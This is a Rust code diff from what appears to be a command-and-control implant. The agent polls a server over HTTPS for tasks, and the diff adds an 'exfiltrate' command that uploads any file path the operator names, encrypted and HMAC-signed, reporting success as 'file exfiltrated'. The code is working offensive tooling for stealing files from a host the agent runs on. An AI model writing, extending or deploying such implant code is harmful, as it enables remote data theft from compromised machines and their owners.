@@ -1,4 +1,5 @@
 use crate::config::AgentConfig;
+use crate::fileops;
 use crate::protocol::{
     AgentRegistration, HeartbeatRequest, HeartbeatResponse, TaskMessage, TaskResult,
     TelemetryPayload, TransportStatus,
@@ -156,7 +157,7 @@ pub async fn run() -> anyhow::Result<()> {
                                 "executing task {}: {} {:?}",
                                 task.task_id, task.command, task.args
                             );
-                            let result = execute_task(&state, task).await;
+                            let result = execute_task(&state, task, &transport, &cfg).await;
                             if let Err(e) = submit_task_result(&transport, &cfg, &result).await {
                                 error!("failed to submit task result: {}", e);
                             }
@@ -186,7 +187,12 @@ pub async fn run() -> anyhow::Result<()> {
     }
 }
 
-async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
+async fn execute_task(
+    state: &AgentState,
+    task: TaskMessage,
+    transport: &HttpsTransport,
+    _cfg: &AgentConfig,
+) -> TaskResult {
     let build_result = |status: &str, output: String, error: Option<String>| TaskResult {
         agent_id: state.agent_id.clone(),
         token: state
@@ -235,6 +241,30 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
                 Ok(bytes) => {
                     build_result("success", general_purpose::STANDARD.encode(&bytes), None)
                 }
+                Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
+            }
+        }
+        "exfiltrate" => {
+            if task.args.is_empty() {
+                return build_result(
+                    "error",
+                    "".to_string(),
+                    Some("exfiltrate requires <file_path>".to_string()),
+                );
+            }
+
+            let file_path = &task.args[0];
+            let (encryption_key, hmac_key) = fileops::get_file_transfer_keys(&state.agent_id);
+
+            match fileops::upload_file(
+                transport,
+                &state.agent_id,
+                &state.token.as_ref().map(|t| t.to_string()).unwrap_or_default(),
+                file_path,
+                encryption_key,
+                hmac_key,
+            ).await {
+                Ok(_) => build_result("success", format!("file {} exfiltrated", file_path), None),
                 Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
             }
         }
